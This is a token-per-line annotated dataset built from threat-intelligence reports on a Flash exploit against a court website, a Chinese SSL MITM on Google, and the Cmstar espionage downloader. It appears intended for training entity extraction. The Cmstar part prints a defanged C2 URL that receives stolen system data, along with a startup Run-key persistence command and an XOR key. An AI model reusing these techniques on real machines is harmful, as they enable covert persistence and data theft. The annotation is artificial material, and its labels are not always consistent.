registered	O
on	O
July	O
9th	O
,	O
2015	O
at	O
06:22Z	O
by	O
a	O
Chinese	O
domain	O
reseller	O
using	O
falsified	O
information	O
such	O
as	O
the	O
name	O
Lanny	O
Chen	O
and	O
address	O
7946	O
N	O
Bridle	O
Creek	O
Way	O
in	O
Xiamen	O
,	O
Taiwan	O
.	O
On	O
an	O
interesting	O
note	O
,	O
the	O
registration	O
address	O
7946	O
N	O
Bridle	O
Creek	O
Way	O
is	O
the	O
same	O
observed	O
within	O
a	O
civil	O
suit	O
between	O
the	O
National	O
Football	O
League	O
and	O
various	O
Chinese	O
domain	O
resellers	O
originally	O
filed	O
in	O
May	O
2014	O
.	O
In	O
early	O
July	O
2015	O
,	O
Chinese	O
APT	O
actors	O
would	O
operationalize	O
an	O
Adobe	O
Flash	O
Player	O
exploit	O
within	O
72	O
hours	O
of	O
its	O
public	O
disclosure	O
,	O
strategically	O
staging	O
it	O
within	O
a	O
specific	O
webpage	O
detailing	O
a	O
noteworthy	O
international	O
legal	O
case	O
between	O
the	O
Philippines	O
and	O
China	O
.	O
This	O
precedent	O
setting	O
legal	O
case	O
would	O
be	O
followed	O
by	O
many	O
Southeast	O
Asian	O
nations	O
,	O
as	O
well	O
as	O
those	O
around	O
the	O
globe	O
.	O
The	O
exploit	O
appeared	O
during	O
the	O
first	O
round	O
of	O
hearings	O
,	O
exposing	O
an	O
untold	O
number	O
of	O
interested	O
parties	O
that	O
visited	O
the	O
webpage	O
.	O
The	O
tactic	O
of	O
leveraging	O
strategic	O
website	O
compromises	O
with	O
patched	O
or	O
unpatched	O
exploits	O
is	O
a	O
well	O
known	O
observable	O
which	O
has	O
been	O
used	O
consistently	O
by	O
various	O
APT	O
groups	O
in	O
recent	O
years	O
.	O
When	O
considered	O
holistically	O
,	O
the	O
intelligence	O
supports	O
the	O
conclusion	O
that	O
this	O
exploitation	O
campaign	O
was	O
purposefully	O
carried	O
out	O
against	O
the	O
backdrop	O
of	O
diplomatic	O
and	O
legal	O
maneuvering	O
.	O
Manila	O
has	O
long	O
recognized	O
they	O
are	O
unable	O
to	O
independently	O
lock	O
horns	O
with	O
China	O
diplomatically	O
or	O
militarily	O
,	O
by	O
invoking	O
dispute	O
settlement	O
procedures	O
under	O
the	O
UNCLOS	O
,	O
an	O
agreement	O
in	O
which	O
both	O
China	O
and	O
the	O
Philippines	O
are	O
signatories	O
.	O
The	O
Philippines	O
is	O
seeking	O
to	O
leverage	O
international	O
law	O
to	O
level	O
the	O
playing	O
field	O
against	O
China	O
's	O
regional	O
diplomatic	O
and	O
military	O
dominance	O
,	O
the	O
ultimate	O
goal	O
being	O
to	O
deter	O
aggressive	O
Chinese	O
expansion	O
activities	O
within	O
the	O
Philippine	O
EEZ	O
and	O
the	O
broader	O
South	O
China	O
Sea	O
.	O
Despite	O
Beijing	O
's	O
unwillingness	O
to	O
participate	O
in	O
the	O
international	O
arbitration	O
and	O
their	O
rejection	O
of	O
the	O
PCA	O
's	O
jurisdiction	O
,	O
there	O
appears	O
to	O
be	O
a	O
distinct	O
effort	O
to	O
surreptitiously	O
monitor	O
those	O
who	O
are	O
interested	O
in	O
this	O
landmark	O
international	O
legal	O
case	O
via	O
electronic	O
means	O
.	O
This	O
vignette	O
also	O
highlights	O
the	O
critical	O
difference	O
between	O
threat	O
data	O
and	O
threat	O
intelligence	O
.	O
The	O
latter	O
goes	O
beyond	O
simply	O
pulling	O
in	O
a	O
stream	O
of	O
open	O
source	O
indicators	O
and	O
blindly	O
pushing	O
them	O
to	O
your	O
enterprise	O
network	O
security	O
devices	O
and	O
SIEM	O
tools	O
hoping	O
something	O
hits	O
(	O
it	O
works	O
great	O
;	O
you	O
'll	O
get	O
TONS	O
of	O
hits	O
…	O
or	O
misses	O
,	O
depending	O
on	O
your	O
perspective	O
)	O
.	O
A	O
true	O
Threat	O
Intelligence	O
Platform	O
enables	O
tactical	O
,	O
operational	O
,	O
and	O
strategic	O
analysis	O
of	O
the	O
details	O
behind	O
the	O
technical	O
how	O
within	O
the	O
context	O
of	O
the	O
non-	O
technical	O
,	O
socio	O
-	O
political	O
why	O
.	O
ThreatConnect	O
has	O
previously	O
shared	O
Threat	O
Intelligence	O
research	O
of	O
espionage	O
activity	O
tied	O
to	O
the	O
increasing	O
tensions	O
within	O
the	O
South	O
China	O
Sea	O
.	O
In	O
a	O
similar	O
fashion	O
,	O
ThreatConnect	O
has	O
shared	O
additional	O
details	O
of	O
this	O
incident	O
to	O
our	O
Common	O
Community	O
within	O
Incident	O
20150710D	O
:	O
Permanent	O
Court	O
of	O
Arbitration	O
Flash	O
Exploit	O
.	O
Log	O
into	O
your	O
ThreatConnect	O
account	O
or	O
register	O
for	O
one	O
via	O
our	O
Community	O
Editions	O
and	O
access	O
the	O
most	O
comprehensive	O
and	O
widely	O
adopted	O
Threat	O
Intelligence	O
Platform	O
on	O
the	O
market	O
.	O
Thursday	O
,	O
04	O
September	O
2014	O
23:55:00	O
(	O
UTC	O
/	O
GMT	O
)	O
The	B-Entity
Chinese	I-Entity
are	O
running	O
a	O
MITM	B-Entity
attack	I-Entity
on	O
SSL	O
encrypted	O
traffic	O
between	O
Chinese	O
universities	O
and	O
Google	O
.	O
We	O
've	O
performed	O
technical	O
analysis	O
of	O
the	O
attack	O
,	O
on	O
request	O
from	O
GreatFire.org	O
,	O
and	O
can	O
confirm	O
that	O
it	O
is	O
a	O
real	O
SSL	O
MITM	O
against	O
www.google.com	O
and	O
that	O
it	O
is	O
being	O
performed	O
from	O
within	O
China	O
.	O
We	O
were	O
contacted	O
by	O
GreatFire.org	O
yesterday	O
(	O
September	O
3	O
)	O
with	O
a	O
request	O
to	O
analyze	O
two	O
packet	O
captures	O
from	O
suspected	O
MITM	O
-	O
attacks	O
before	O
they	O
finalized	O
their	O
blog	O
post	O
.	O
The	O
conclusions	O
from	O
our	O
analysis	O
is	O
now	O
published	O
as	O
part	O
of	O
GreatFire.org	O
's	O
great	O
blog	O
post	O
titled	O
"	O
Authorities	O
launch	O
man	O
-	O
in	O
-	O
the-	O
middle	O
attack	O
on	O
Google	O
"	O
.	O
In	O
their	O
blog	O
post	O
GreatFire.org	O
write	O
.	O
From	O
August	O
28	O
,	O
2014	O
reports	O
appeared	O
on	O
Weibo	O
and	O
Google	O
Plus	O
that	O
users	O
in	O
China	O
trying	O
to	O
access	O
google.com	O
and	O
google.com.hk	O
via	O
CERNET	O
,	O
the	O
country	O
's	O
education	O
network	O
,	O
were	O
receiving	O
warning	O
messages	O
about	O
invalid	O
SSL	O
certificates	O
.	O
The	O
evidence	O
,	O
which	O
we	O
include	O
later	O
in	O
this	O
post	O
,	O
indicates	O
that	O
this	O
was	O
caused	O
by	O
a	O
man	O
-	O
in	O
-	O
the	O
-	O
middle	O
attack	O
.	O
While	O
the	O
authorities	O
have	O
been	O
blocking	O
access	O
to	O
most	O
things	O
Google	O
since	O
June	O
4th	O
,	O
they	O
have	O
kept	O
their	O
hands	O
off	O
of	O
CERNET	O
,	O
China	O
's	O
nationwide	O
education	O
and	O
research	O
network	O
.	O
However	O
,	O
in	O
the	O
lead	O
up	O
to	O
the	O
new	O
school	O
year	O
,	O
the	O
Chinese	O
authorities	O
launched	O
a	O
man	O
-	O
in	O
-	O
the	O
-	O
middle	O
(	O
MITM	O
)	O
attack	O
against	O
Google	O
.	O
Our	O
network	O
forensic	O
analysis	O
was	O
performed	O
by	O
investigating	O
the	O
following	O
to	O
packet	O
capture	O
files	O
.	O
The	O
analyzed	O
capture	O
files	O
contain	O
pure	O
IPv6	O
traffic	O
(	O
CERNET	O
is	O
a	O
IPv6	O
network	O
)	O
which	O
made	O
the	O
analysis	O
a	O
bit	O
different	O
then	O
usual	O
.	O
We	O
do	O
not	O
disclose	O
the	O
client	O
IP	O
addresses	O
for	O
privacy	O
reasons	O
,	O
but	O
they	O
both	O
seem	O
legit	O
;	O
one	O
from	O
Peking	O
University	O
(	O
netname	O
PKU6-CERNET2	O
)	O
and	O
the	O
other	O
from	O
Chongqing	O
University	O
(	O
CQU6-CERNET2	O
)	O
.	O
Both	O
IP	O
addresses	O
belong	O
to	O
AS23910	O
,	O
named	O
"	O
China	O
Next	O
Generation	O
Internet	O
CERNET2	O
"	O
.	O
The	O
IP	O
addresses	O
received	O
for	O
www.google.com	O
were	O
in	O
both	O
cases	O
also	O
legit	O
,	O
so	O
the	O
MITM	O
was	O
n't	O
carried	O
out	O
through	O
DNS	O
spoofing	O
.	O
The	O
Peking	O
University	O
client	O
connected	O
to	O
2607:f8b0:4007:804::1013	O
(	O
GOOGLE	O
-	O
IPV6	O
in	O
United	O
States	O
)	O
and	O
the	O
connection	O
from	O
Chongqing	O
University	O
went	O
to	O
2404:6800:4005:805::1010	O
(	O
GOOGLE_IPV6_AP-20080930	O
in	O
Australia	O
)	O
.	O
The	O
Time	O
-	O
To	O
-	O
Live	O
(	O
TTL	O
)	O
values	O
received	O
in	O
the	O
IP	O
packets	O
from	O
www.google.com	O
were	O
in	O
both	O
cases	O
248	O
or	O
249	O
(	O
note	O
:	O
TTL	O
is	O
actually	O
called	O
"	O
Hop	O
Limit	O
"	O
in	O
IPv6	O
nomenclature	O
,	O
but	O
we	O
prefer	O
to	O
use	O
the	O
well	O
established	O
term	O
"	O
TTL	O
"	O
anyway	O
)	O
.	O
The	O
highest	O
possible	O
TTL	O
value	O
is	O
255	O
,	O
this	O
means	O
that	O
the	O
received	O
packets	O
haven't	O
made	O
more	O
than	O
6	O
or	O
7	O
router	O
hops	O
before	O
ending	O
up	O
at	O
the	O
client	O
.	O
However	O
,	O
the	O
expected	O
number	O
of	O
router	O
hops	O
between	O
a	O
server	O
on	O
GOOGLE	O
-	O
IPV6	O
and	O
the	O
client	O
at	O
Peking	O
University	O
is	O
around	O
14	O
.	O
The	O
low	O
number	O
of	O
router	O
hops	O
is	O
is	O
a	O
clear	O
indication	O
of	O
an	O
IP	O
MITM	O
taking	O
place	O
.	O
Here	O
is	O
an	O
IPv6	O
traceroute	O
from	O
AS25795	O
in	O
Los	O
Angeles	O
towards	O
the	O
IP	O
address	O
at	O
Peking	O
University	O
(	O
generated	O
with	O
ARP	O
Networks	O
'	O
4or6.com	O
tool	O
)	O
.	O
#	O
traceroute	O
-6	O
2001:da8:[REDACTED	O
]	O
1	O
2607:f2f8:1600::1	O
(	O
2607:f2f8:1600::1	O
)	O
1.636	O
ms	O
1.573	O
ms	O
1.557	O
ms	O
2	O
2001:504:13::1a	O
(	O
2001:504:13::1a	O
)	O
40.381	O
ms	O
40.481	O
ms	O
40.565	O
ms	O
3	O
*	O
*	O
*	O
4	O
2001:252:0:302::1	O
(	O
2001:252:0:302::1	O
)	O
148.409	O
ms	O
148.501	O
ms	O
148.595	O
ms	O
5	O
*	O
*	O
*	O
6	O
2001:252:0:1::1	O
(	O
2001:252:0:1::1	O
)	O
148.273	O
ms	O
147.620	O
ms	O
147.596	O
ms	O
7	O
pku-bj-v6.cernet2.net	O
(	O
2001:da8:1:1b::2	O
)	O
147.574	O
ms	O
147.619	O
ms	O
147.420	O
ms	O
8	O
2001:da8:1:50d::2	O
(	O
2001:da8:1:50d::2	O
)	O
148.582	O
ms	O
148.670	O
ms	O
148.979	O
ms	O
9	O
cernet2.net	O
(	O
2001:da8:ac	O
:	O
ffff::2	O
)	O
147.963	O
ms	O
147.956	O
ms	O
147.988	O
ms	O
10	O
2001:da8:[REDACTED	O
]	O
147.964	O
ms	O
148.035	O
ms	O
147.895	O
ms	O
11	O
2001:da8:[REDACTED	O
]	O
147.832	O
ms	O
147.881	O
ms	O
147.836	O
ms	O
12	O
2001:da8:[REDACTED	O
]	O
147.809	O
ms	O
147.707	O
ms	O
147.899	O
ms	O
As	O
can	O
be	O
seen	O
in	O
the	O
traceroute	O
above	O
,	O
seven	O
hops	O
before	O
the	O
client	O
we	O
find	O
the	O
2001:252::/32	O
network	O
,	O
which	O
is	O
called	O
"	O
CNGI	O
International	O
Gateway	O
Network	O
(	O
CNGIIGN	O
)	O
"	O
.	O
This	O
network	O
is	O
actually	O
part	O
of	O
CERNET	O
,	O
but	O
on	O
AS23911	O
,	O
which	O
is	O
the	O
network	O
that	O
connects	O
CERNET	O
with	O
its	O
external	O
peers	O
.	O
A	O
reasonable	O
assumption	O
is	O
therefore	O
that	O
the	B-Entity
MITM	I-Entity
is	O
carried	B-Action
out	I-Action
on	B-Modifier
the	O
2001:252::/32	B-Entity
network	I-Entity
,	O
or	O
where	O
AS23910	O
(	O
2001:da8:1::2	O
)	O
connects	O
to	O
AS23911	O
(	O
2001:252:0:1::1	O
)	O
.	O
This	O
means	O
that	O
the	O
MITM	O
attack	O
is	O
being	O
conducted	O
from	O
within	O
China	O
.	O
The	O
round	O
-	O
trip	O
time	O
between	O
the	O
client	O
and	O
server	O
can	O
be	O
estimated	O
by	O
measuring	O
the	O
time	O
from	O
when	O
the	O
client	O
sends	O
it	O
initial	O
TCP	O
SYN	O
packet	O
to	O
when	O
it	O
receives	O
a	O
TCP	O
SYN+ACK	O
from	O
the	O
server	O
.	O
The	O
expected	O
round	O
-	O
trip	O
time	O
for	O
connecting	O
from	O
CERNET	O
to	O
a	O
Google	O
server	O
overseas	O
would	O
be	O
around	O
150ms	O
or	O
more	O
.	O
However	O
,	O
in	O
the	O
captures	O
we	O
've	O
analyzed	O
the	O
TCP	O
SYN+ACK	O
package	O
was	O
received	O
in	O
just	O
8ms	O
(	O
Peking	O
)	O
and	O
52ms	O
(	O
Chongqing	O
)	O
respectively	O
.	O
Again	O
,	O
this	O
is	O
a	O
clear	O
indication	O
of	O
an	O
IP	B-Entity
MITM	I-Entity
taking	O
place	O
,	O
since	O
Google	O
can	O
not	O
possibly	O
send	O
a	O
response	O
from	O
the	O
US	O
to	O
CERNET	O
within	O
8ms	O
regardless	O
of	O
how	O
fast	O
they	O
are	O
.	O
The	O
fast	O
response	O
times	O
also	O
indicate	O
that	O
the	O
machine	O
performing	O
the	O
MITM	O
is	O
located	O
fairly	O
close	O
to	O
the	O
network	O
at	O
Peking	O
University	O
.	O
Even	O
though	O
the	O
machine	O
performing	O
the	O
MITM	O
was	O
very	O
quick	O
at	O
performing	O
the	O
TCP	O
tree	O
-	O
way	O
handshake	O
we	O
noticed	O
that	O
the	O
application	O
layer	O
communication	O
was	O
terribly	O
slow	O
.	O
The	O
specification	O
for	O
the	O
TLS	O
handshake	O
(	O
RFC	O
2246	O
)	O
defines	O
that	O
a	O
ClientHello	O
message	O
should	O
be	O
responded	O
to	O
with	O
a	O
ServerHello	O
.	O
Google	O
typically	O
send	O
their	O
ServerHello	O
response	O
almost	O
instantly	O
,	O
i.e.	O
the	O
response	O
is	O
received	O
after	O
one	O
round	O
-	O
trip	O
time	O
(	O
150ms	O
in	O
this	O
case	O
)	O
.	O
However	O
,	O
in	O
the	O
analyzed	O
captures	O
we	O
noticed	O
ServerHello	O
response	O
times	O
of	O
around	O
500ms	O
.	O
We	O
extracted	O
the	O
X.509	O
certificates	O
from	O
the	O
two	O
capture	O
files	O
to	O
.cer	O
files	O
using	O
NetworkMiner	O
.	O
We	O
noticed	O
that	O
both	O
users	O
received	O
identical	O
certificates	O
,	O
which	O
were	O
both	O
self	O
signed	O
for	O
"	O
google.com	O
"	O
.	O
The	O
fact	O
that	O
the	O
MITM	O
used	O
a	O
self	O
signed	O
certificate	O
makes	O
the	O
attack	O
easily	O
detectable	O
even	O
for	O
the	O
non-	O
technical	O
user	O
,	O
since	O
the	O
web	O
browser	O
will	O
typically	O
display	O
a	O
warning	O
about	O
the	O
site	O
not	O
being	O
trusted	O
.	O
Additionally	O
the	O
X.509	O
certificate	O
was	O
created	O
for	O
"	O
google.com	O
"	O
rather	O
than	O
"	O
*	O
.google.com	O
"	O
.	O
This	O
is	O
an	O
obvious	O
miss	O
from	O
the	O
MITM'ers	O
side	O
since	O
they	O
were	O
attempting	O
to	O
MITM	O
traffic	O
to	O
"	O
www.google.com	O
"	O
but	O
not	O
to	O
"	O
google.com	O
"	O
.	O
Certificate	O
SHA1	O
fingerprint	O
:	O
f6beadb9bc02e0a152d71c318739cdecfc1c085d	O
Certificate	O
MD5	O
fingerprint	O
:	O
66:D5:D5:6A	O
:	O
E9:28:51:7C:03:53:C5:E1:33:14:A8:3B	O
A	O
copy	O
of	O
the	O
fake	O
certificate	O
is	O
available	O
on	O
Google	O
drive	O
thanks	O
to	O
GreatFire.org	O
.	O
All	O
evidence	O
indicates	O
that	O
a	B-Entity
MITM	I-Entity
attack	I-Entity
is	O
being	B-Action
conducted	I-Action
against	O
traffic	B-Action
between	B-Entity
China	I-Entity
's	I-Entity
nationwide	I-Entity
education	I-Entity
and	I-Entity
research	I-Entity
network	I-Entity
CERNET	I-Entity
and	I-Entity
www.google.com	I-Entity
.	O
It	O
looks	O
as	O
if	O
the	O
MITM	O
is	O
carried	O
out	O
on	O
a	O
network	O
belonging	O
to	O
AS23911	O
,	O
which	O
is	O
the	O
outer	O
part	O
of	O
CERNET	O
that	O
peers	O
with	O
all	O
external	O
networks	O
.	O
This	O
network	O
is	O
located	O
in	O
China	O
,	O
so	O
we	O
can	O
conclude	O
that	O
the	O
MITM	O
was	O
being	O
done	O
within	O
the	O
country	O
.	O
It	O
's	O
difficult	O
to	O
say	O
exactly	O
how	O
the	O
MITM	O
attack	O
was	O
carried	O
out	O
,	O
but	O
we	O
can	O
dismiss	O
DNS	O
spoofing	O
as	O
the	O
used	O
method	O
.	O
The	O
evidence	O
we	O
've	O
observed	O
instead	O
indicate	O
that	O
the	O
MITM	O
attack	O
is	O
performed	O
either	O
by	O
performing	O
IP	O
hijacking	O
or	O
by	O
simply	O
reconfiguring	O
a	O
router	O
to	O
forward	O
the	B-Entity
HTTPS	I-Entity
traffic	I-Entity
to	I-Entity
a	I-Entity
transparent	I-Entity
SSL	I-Entity
proxy	I-Entity
.	O
An	O
alternative	O
to	O
changing	O
the	O
router	O
config	O
would	O
also	O
be	O
to	O
add	O
an	O
in	O
-	O
line	O
device	O
that	O
redirects	O
the	O
desired	O
traffic	O
to	O
the	O
SSL	O
proxy	O
.	O
However	O
,	O
regardless	O
of	O
how	O
they	O
did	O
it	O
the	O
attacker	O
would	O
be	O
able	O
to	O
decrypt	O
and	O
inspect	O
the	O
traffic	O
going	O
to	O
Google	O
.	O
We	O
can	O
also	O
conclude	O
that	O
the	O
method	O
used	O
to	O
perform	O
the	O
MITM	O
attack	O
was	O
similar	O
to	O
the	O
Chinese	O
MITM	O
on	O
GitHub	O
,	O
but	O
not	O
identical	O
.	O
In	O
recent	O
weeks	O
,	O
Unit	O
42	O
has	O
been	O
analyzing	O
delivery	O
documents	O
used	O
in	O
spear	B-Entity
-	I-Entity
phishing	I-Entity
attacks	I-Entity
that	O
drop	O
a	O
custom	B-Entity
downloader	I-Entity
used	O
in	O
cyber	O
espionage	O
attacks	O
.	O
This	O
specific	O
downloader	O
,	O
Cmstar	O
,	O
is	O
associated	O
with	O
the	O
Lurid	O
downloader	O
also	O
known	O
as	O
'	O
Enfal	O
'	O
.	O
Cmstar	O
was	O
named	O
for	O
the	O
log	O
message	O
'	O
CM	O
*	O
*	O
'	O
used	O
by	O
the	O
downloader	O
.	O
Unit	O
42	O
is	O
aware	O
of	O
threat	O
actors	O
using	O
two	O
toolkits	O
–	O
MNKit	O
and	O
the	O
Tran	O
Duy	O
Linh	O
toolkit	O
–	O
to	O
produce	O
malicious	O
documents	O
that	O
exploit	O
CVE-2012	O
-	O
0158	O
in	O
order	O
to	O
implant	O
Cmstar	O
.	O
The	O
Cmstar	O
downloader	O
itself	O
has	O
several	O
unique	O
and	O
interesting	O
features	O
,	O
as	O
well	O
as	O
substantial	O
infrastructure	O
overlap	O
with	O
other	O
tools	O
worth	O
discussing	O
.	O
The	O
Cmstar	O
downloader	O
starts	O
by	O
manually	O
building	O
its	O
import	O
address	O
table	O
(	O
IAT	O
)	O
,	O
much	O
like	O
shellcode	O
would	O
;	O
however	O
,	O
it	O
uses	O
a	O
rather	O
unique	O
technique	O
.	O
Instead	O
of	O
finding	O
API	O
function	O
names	O
based	O
on	O
their	O
hashed	O
values	O
,	O
this	B-Entity
malware	I-Entity
enumerates	B-Action
libraries	B-Entity
'	B-Entity
export	I-Entity
address	I-Entity
table	I-Entity
(	I-Entity
EAT	I-Entity
)	O
and	O
searches	O
for	O
the	O
name	O
of	O
the	O
API	O
function	O
the	O
payload	O
needs	O
to	O
load	B-Action
by	O
using	O
a	O
character	O
to	O
offset	O
array	O
.	O
The	O
payload	O
pairs	O
several	O
comma	O
-	O
separated	O
lists	O
of	O
characters	O
with	O
comma	O
-	O
separated	O
lists	O
of	O
numbers	O
.	O
Each	O
list	O
of	O
characters	O
consists	O
of	O
the	O
set	O
found	O
within	O
the	O
API	O
function	O
name	O
the	O
payload	O
seeks	O
to	O
add	O
to	O
its	O
IAT	O
,	O
while	O
the	O
corresponding	O
list	O
of	O
numbers	O
specifies	O
the	O
offset	O
in	O
the	O
function	O
name	O
where	O
those	O
characters	O
should	O
be	O
placed	O
.	O
For	O
example	O
,	O
if	O
the	O
payload	O
has	O
"	O
D	O
,	O
e	O
,	O
A	O
"	O
paired	O
with	O
"	O
0,5,19	O
"	O
,	O
this	O
results	O
in	O
the	O
following	O
mapping	O
.	O
The	O
payload	O
loads	O
a	O
specific	O
Windows	O
library	O
's	O
EAT	O
by	O
calling	O
the	O
ImageDirectoryEntryToData	O
API	O
function	O
using	O
the	O
IMAGE_DIRECTORY_ENTRY_EXPORT	O
flag	O
.	O
It	B-Entity
then	O
enumerates	O
the	O
library	O
's	O
EAT	O
to	O
find	O
exported	O
function	O
names	O
by	O
checking	O
each	O
function	O
name	O
for	O
the	O
character	O
and	O
the	O
specific	O
offset	O
.	O
Once	O
found	O
,	O
the	O
payload	O
adds	O
the	O
address	O
for	O
the	O
specific	O
API	O
function	O
to	O
its	O
IAT	O
.	O
For	O
instance	O
,	O
the	O
payload	O
checks	O
the	O
EAT	O
of	O
"	O
wininet.dll	O
"	O
using	O
the	O
comparisons	O
mentioned	O
above	O
to	O
find	O
the	O
address	O
to	O
the	O
"	O
DeleteUrlCacheEntryA	O
"	O
API	O
function	O
.	O
One	O
specific	O
Cmstar	O
payload	O
that	O
we	O
analyzed	O
used	O
the	O
character	O
/	O
offsets	O
seen	O
in	O
Figure	O
1	O
to	O
locate	O
the	O
API	O
functions	O
within	O
three	O
different	O
Windows	O
libraries	O
to	O
build	O
its	O
IAT	O
.	O
After	O
manually	O
creating	O
the	O
IAT	O
,	O
Cmstar	O
decrypts	O
its	O
configuration	O
,	O
several	O
encrypted	O
strings	O
,	O
and	O
a	O
piece	O
of	O
shellcode	O
.	O
The	O
embedded	O
configuration	O
contains	O
nothing	O
more	O
than	O
a	B-Entity
URL	I-Entity
that	O
Cmstar	B-Entity
uses	B-Action
as	O
its	B-Action
command	B-Entity
and	I-Entity
control	I-Entity
(	I-Entity
C2	I-Entity
)	I-Entity
location	I-Entity
.	O
The	O
encrypted	O
strings	O
within	O
the	O
Trojan	O
include	O
fields	O
used	O
within	O
the	O
HTTP	B-Entity
requests	I-Entity
that	O
Cmstar	O
will	O
create	B-Action
to	O
communicate	B-Action
with	B-Entity
its	I-Entity
C2	I-Entity
server	I-Entity
,	O
as	O
well	O
as	O
additional	O
strings	O
used	O
to	O
interact	O
with	O
the	O
registry	O
.	O
The	O
Cmstar	B-Entity
sample	I-Entity
associated	I-Entity
with	I-Entity
the	I-Entity
MNKIT	I-Entity
delivery	I-Entity
document	I-Entity
creates	B-Action
the	O
following	B-Entity
registry	I-Entity
key	I-Entity
to	B-Modifier
automatically	O
execute	B-Entity
at	I-Entity
system	I-Entity
startup	I-Entity
.	O
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs	O
:	O
"	O
rundll32.exe	O
C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\xpsfiltsvcs.dll	O
,	O
XpsRegisterServer	O
"	O
Unit	O
42	O
found	O
an	O
additional	O
encrypted	O
registry	O
key	O
that	O
would	O
allow	O
Cmstar	O
to	O
automatically	O
start	O
up	O
after	O
reboots	O
.	O
However	O
,	O
the	O
code	O
does	O
not	O
decrypt	O
,	O
reference	O
,	O
or	O
use	O
the	O
following	O
registry	O
key	O
in	O
any	O
way	O
,	O
which	O
suggests	O
that	O
the	O
malware	O
author	O
left	O
this	O
artifact	O
in	O
the	O
code	O
after	O
swapping	O
to	O
the	O
run	O
key	O
listed	O
above	O
.	O
HKCU\Software\Microsoft\CTF\LangBarAddIn	O
Cmstar	O
also	O
decrypts	B-Action
a	B-Entity
752-byte	I-Entity
piece	I-Entity
of	I-Entity
shellcode	I-Entity
that	O
carries	B-Action
out	I-Action
communications	B-Entity
with	O
the	O
C2	B-Entity
server	I-Entity
,	O
specifically	O
by	O
sending	O
HTTP	O
POST	B-Entity
requests	B-Action
to	B-Modifier
the	O
following	B-Entity
URL	I-Entity
.	O
http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi	O
It	O
should	O
be	O
noted	O
that	O
the	O
C2	O
URL	O
contains	O
the	O
string	O
'	O
cgl	O
-	O
bin	O
'	O
,	O
which	O
visually	O
resembles	O
the	O
common	O
cgi-	O
bin	O
folder	O
used	O
by	O
many	O
webservers	O
to	O
run	O
server	O
-	O
side	O
scripts	O
.	O
Unit	O
42	O
used	O
the	O
Palo	O
Alto	O
Networks	O
AutoFocus	O
threat	O
intelligence	O
service	O
to	O
locate	O
additional	O
samples	O
using	O
the	O
'	O
cgl	O
-	O
bin	O
'	O
string	O
within	O
URLs	O
of	O
HTTP	O
requests	O
and	O
found	O
several	O
samples	O
of	O
the	O
Cmwhite	O
tool	O
associated	O
with	O
the	O
LURID	O
/	O
Enfal	O
downloader1	O
,	O
as	O
seen	O
in	O
Figure	O
2	O
.	O
Cmstar	O
's	O
HTTP	O
POST	O
requests	O
sent	O
to	O
'	O
happy.launchtrue[.]com	O
'	O
contain	O
data	O
that	O
the	B-Entity
Trojan	I-Entity
gathers	B-Action
from	O
the	O
infected	B-Entity
machine	I-Entity
that	O
has	O
the	O
following	O
structure	O
.	O
<	O
Windows	O
Version	O
number>@@<CPU	O
Architecture	O
(	O
2	O
for	O
x64	O
,	O
1	O
for	O
x86)>??<boolean	O
for	O
elevated	O
privileges>]]**<boolean	O
if	O
antivirus	O
processes	O
are	O
found>!!<static	O
version	O
string>==	O
In	O
one	O
example	O
,	O
Unit	O
42	O
observed	O
the	O
following	O
data	O
within	O
an	O
analysis	O
environment	O
,	O
which	O
was	O
then	O
encrypted	O
using	O
a	O
single	O
-	O
byte	O
XOR	O
algorithm	O
and	O
a	O
key	O
of	O
0x45	O
before	O
being	O
sent	O
to	O
the	O
C2	O
server	O
.	O
510@@1??1]]**0!!150316o==	O
Helpfully	O
,	O
the	B-Entity
malware	I-Entity
author	I-Entity
writes	I-Entity
log	B-Action
messages	B-Entity
to	B-Modifier
the	O
'	B-Entity
DF64159.TMP	I-Entity
'	I-Entity
file	I-Entity
,	O
used	O
for	O
debugging	O
purposes	O
throughout	O
the	O
execution	O
of	O
the	O
Cmstar	O
downloader	O
.	O
The	O
log	O
messages	O
are	O
abbreviated	O
strings	O
that	O
describe	O
specific	O
activities	O
during	O
the	O
execution	O
of	O
the	O
code	O
.	O
For	O
instance	O
,	O
the	O
downloader	O
uses	O
the	O
CreateMutex	O
to	O
create	O
a	O
mutex	O
named	O
'	O
{	O
53A4988C	O
-	O
F91F-4054	O
-	O
9076	O
-	O
220AC5EC03F3	O
}	O
'	O
to	O
determine	O
if	O
another	O
instance	O
of	O
the	O
code	O
is	O
running	O
.	O
If	O
the	O
downloader	O
determines	O
another	O
instance	O
of	O
itself	O
is	O
running	O
,	O
the	O
code	O
writes	O
the	O
string	O
'	O
CM	O
*	O
*	O
'	O
–	O
which	O
happens	O
to	O
be	O
the	O
basis	O
for	O
the	O
name	O
of	O
the	O
Trojan	O
–	O
to	O
the	O
log	O
file	O
.	O
Unit	O
42	O
created	O
a	O
Yara	O
signature	O
to	O
detect	O
Cmstar	O
samples	O
based	O
on	O
these	O
debugging	O
strings	O
,	O
which	O
is	O
available	O
in	O
the	O
appendix	O
.	O
As	O
mentioned	O
in	O
the	O
behavioral	O
analysis	O
section	O
,	O
the	B-Entity
Cmstar	I-Entity
downloader	I-Entity
gathers	B-Action
system	B-Entity
-	B-Entity
specific	I-Entity
information	I-Entity
to	O
send	B-Action
to	B-Entity
the	I-Entity
C2	I-Entity
server	I-Entity
.	O
One	O
such	O
piece	O
of	O
information	O
is	O
the	O
existence	O
of	O
specific	O
running	O
processes	O
.	O
Many	O
malware	O
families	O
and	O
tools	O
check	O
for	O
the	O
existence	O
of	O
antivirus	O
,	O
but	O
the	O
Cmstar	O
tool	O
does	O
so	O
in	O
a	O
clever	O
way	O
.	O
Rather	O
than	O
including	O
a	O
list	O
of	O
strings	O
of	O
associated	O
processes	O
,	O
Cmstar	O
enumerates	O
the	O
running	O
processes	O
and	O
subjects	O
these	O
process	O
names	O
to	O
a	O
hashing	O
algorithm	O
.	O
The	O
results	O
of	O
this	O
algorithm	O
are	O
then	O
compared	O
against	O
three	O
static	O
values	O
:	O
0x1E00AFA	O
,	O
0xBEE091E8	O
and	O
0xD46FCDFA	O
.	O
Unit	O
42	O
reverse	O
engineered	O
the	O
algorithm	O
and	O
created	O
the	O
function	O
seen	O
below	O
to	O
generate	O
hashes	O
in	O
order	O
to	O
determine	O
the	O
processes	O
Cmstar	O
is	O
trying	O
to	O
find	O
.	O
Unit	O
42	O
found	O
that	O
the	O
string	O
'	O
avp	O
'	O
subjected	O
to	O
the	O
algorithm	O
above	O
results	O
in	O
the	O
value	O
0x1E00AFA	O
,	O
which	O
suggests	B-Action
the	B-Entity
